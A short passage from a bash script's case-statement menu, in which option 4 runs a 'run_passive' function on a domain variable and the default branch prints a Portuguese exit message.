  4) run_passive "$domain" ;;
  *) echo "Saindo…" ;;
esac
